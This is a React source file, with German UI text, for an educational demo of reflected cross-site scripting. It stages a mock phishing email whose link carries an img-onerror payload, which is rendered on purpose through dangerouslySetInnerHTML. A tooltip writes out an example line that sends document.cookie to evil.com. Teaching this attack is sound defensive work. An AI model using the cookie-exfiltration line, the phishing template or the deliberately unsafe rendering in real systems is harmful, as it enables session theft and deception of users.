import { useState, useEffect } from "react"
import { Arrow, TraceBlock, XSS_PAYLOAD, ReflectedOutput } from "./shared"

const DISPLAY_URL = `https://seite.at/suche?q=<img src=x onerror="...">`
const ATTACK_URL = `https://seite.at/suche?q=${XSS_PAYLOAD}`

// ---------------------------------------------------------------------------
// ReflectedXss
// ---------------------------------------------------------------------------

export function ReflectedXss({ onOutput }: { onOutput: (o: ReflectedOutput) => void }) {
  const [clicked, setClicked] = useState(false)
  const [xssTriggered, setXssTriggered] = useState(false)

  useEffect(() => {
    const handler = () => setXssTriggered(true)
    document.addEventListener("xss-triggered", handler)
    return () => document.removeEventListener("xss-triggered", handler)
  }, [])

  function handleLinkClick(e: React.MouseEvent) {
    e.preventDefault()
    setClicked(true)
    onOutput({ value: XSS_PAYLOAD, safe: false })
  }

  return (
    <div className="flex flex-col gap-3 text-sm">

      {/* 4-Schritt-Erklärung */}
      <ol className="flex flex-col gap-1 text-sm text-muted-foreground list-decimal list-inside">
        <li>
          Angreifer baut eine manipulierte URL:{" "}
          <code className="bg-muted px-1 rounded text-xs break-all">{DISPLAY_URL}</code>
        </li>
        <li>Opfer klickt diesen Link (z.B. aus einer Phishing-Mail)</li>
        <li>Der Server/die Seite liest den URL-Parameter und rendert ihn zurück („reflects")</li>
        <li>Das Skript führt sich im Browser des Opfers aus</li>
      </ol>

      {/* Mock-E-Mail */}
      <div className="rounded-md border text-xs overflow-hidden">
        <div className="bg-muted px-3 py-2 flex flex-col gap-0.5 border-b">
          <p><span className="font-semibold">Von:</span> support@seite.at.evil.com</p>
          <p><span className="font-semibold">An:</span> opfer@beispiel.at</p>
          <p><span className="font-semibold">Betreff:</span> ⚠ Ihr Konto wurde gesperrt – sofort handeln</p>
        </div>
        <div className="px-3 py-3 flex flex-col gap-2 text-foreground">
          <p>Hallo,</p>
          <p>
            Ihr Konto auf <span className="font-medium">seite.at</span> wurde aus
            Sicherheitsgründen vorübergehend gesperrt. Bitte klicken Sie auf den folgenden
            Link, um Ihr Konto sofort wiederherzustellen:
          </p>
          <a
            href={ATTACK_URL}
            onClick={handleLinkClick}
            className="text-blue-600 underline underline-offset-2 break-all hover:text-blue-800 cursor-pointer"
          >
            Jetzt Konto wiederherstellen →
          </a>
          <p className="text-muted-foreground text-[11px] break-all">{ATTACK_URL}</p>
          <p className="mt-1">Mit freundlichen Grüßen<br />Support-Team seite.at</p>
        </div>
      </div>

      {/* XSS Banner */}
      {xssTriggered && (
        <div className="rounded-md bg-destructive/10 border border-destructive px-3 py-2 text-xs text-destructive">
          <span className="font-semibold">⚠ XSS erfolgreich! Schadcode wurde ausgeführt.</span>
          <span className="font-normal"> Ein echter Angreifer könnte damit Session-Cookies stehlen, Tastatureingaben mitschneiden oder den Nutzer auf eine gefälschte Login-Seite umleiten.</span>
        </div>
      )}

      {/* ⚠️ UNSICHER: Payload aus URL wird als HTML gerendert – Reflected XSS */}
      {clicked && (
        <div className="hidden" dangerouslySetInnerHTML={{ __html: XSS_PAYLOAD }} />
      )}
    </div>
  )
}

// ---------------------------------------------------------------------------
// ReflectedCodeTrace
// ---------------------------------------------------------------------------

export function ReflectedCodeTrace({ output }: { output: ReflectedOutput | null }) {
  if (!output) {
    return (
      <p className="text-xs text-muted-foreground">
        Klicke auf den Link in der E-Mail, um den Code-Ablauf zu sehen.
      </p>
    )
  }

  return (
    <div className="flex flex-col gap-3 text-xs">
      <TraceBlock step="①" label="Manipulierte URL (Angreifer)">
        {DISPLAY_URL}
      </TraceBlock>

      <Arrow />

      <TraceBlock step="②" label="Opfer öffnet Link → Seite liest URL-Parameter">
        {`// React liest den Query-Parameter aus der URL
const [searchParams] = useSearchParams()
const q = searchParams.get("q")
// q = '<img src=x onerror="document.dispatchEvent(...)">'`}
      </TraceBlock>

      <Arrow />

      {/* ③ mit Tooltip */}
      <div className="flex flex-col gap-1">
        <div className="relative group w-fit">
          <p className="text-xs font-semibold text-muted-foreground cursor-help underline decoration-dotted underline-offset-2">
            <span className="mr-1">③</span>dangerouslySetInnerHTML rendert Payload als HTML
          </p>
          <div className="absolute bottom-full left-0 mb-2 w-80 rounded-md bg-popover border border-border shadow-md px-3 py-2 text-xs text-popover-foreground invisible group-hover:visible z-50 leading-relaxed">
            <p className="font-semibold mb-1">Warum ist das unsicher?</p>
            <p><code className="bg-muted px-0.5 rounded">dangerouslySetInnerHTML</code> schreibt einen rohen HTML-String direkt in den DOM — ohne Prüfung oder Escapierung. Der Name ist Absicht: React warnt dich damit explizit.</p>
            <p className="mt-1">Der URL-Parameter <code className="bg-muted px-0.5 rounded">q</code> wird direkt als HTML gerendert. Was auch immer in der URL steht, landet 1:1 als echter HTML-Code im Browser.</p>
          </div>
        </div>
        <pre className="bg-muted rounded p-2 text-xs overflow-x-auto whitespace-pre-wrap">{`// ⚠️ UNSICHER: Parameter wird direkt als HTML gerendert
<div dangerouslySetInnerHTML={{ __html: q }} />

// Gerendert im DOM:
// <div><img src=x onerror="document.dispatchEvent(...)"></div>`}</pre>
      </div>

      <Arrow />

      {/* ④ mit Tooltip */}
      <div className="flex flex-col gap-1">
        <div className="relative group w-fit">
          <p className="text-xs font-semibold text-muted-foreground cursor-help underline decoration-dotted underline-offset-2">
            <span className="mr-1">④</span>Browser führt Script aus
          </p>
          <div className="absolute bottom-full left-0 mb-2 w-80 rounded-md bg-popover border border-border shadow-md px-3 py-2 text-xs text-popover-foreground invisible group-hover:visible z-50 leading-relaxed">
            <p className="font-semibold mb-1">Warum löst das Bild den Angriff aus?</p>
            <p><code className="bg-muted px-0.5 rounded">src="x"</code> existiert nicht — der Ladeversuch schlägt sofort fehl. Genau das ist gewollt: Der <code className="bg-muted px-0.5 rounded">onerror</code>-Handler feuert bei jedem Ladefehler und führt das Schadskript aus.</p>
            <p className="mt-1">Ein echter Angreifer würde statt <code className="bg-muted px-0.5 rounded">dispatchEvent(...)</code> z.B. <code className="bg-muted px-0.5 rounded">{"fetch('https://evil.com?c='+document.cookie)"}</code> einsetzen.</p>
          </div>
        </div>
        <pre className="bg-muted rounded p-2 text-xs overflow-x-auto whitespace-pre-wrap">{`→ <img> wird in den DOM eingefügt.\n   src="x" schlägt fehl → onerror feuert.\n   CustomEvent "xss-triggered" wird dispatched.\n   React Banner: "⚠ XSS erfolgreich!"`}</pre>
      </div>
    </div>
  )
}
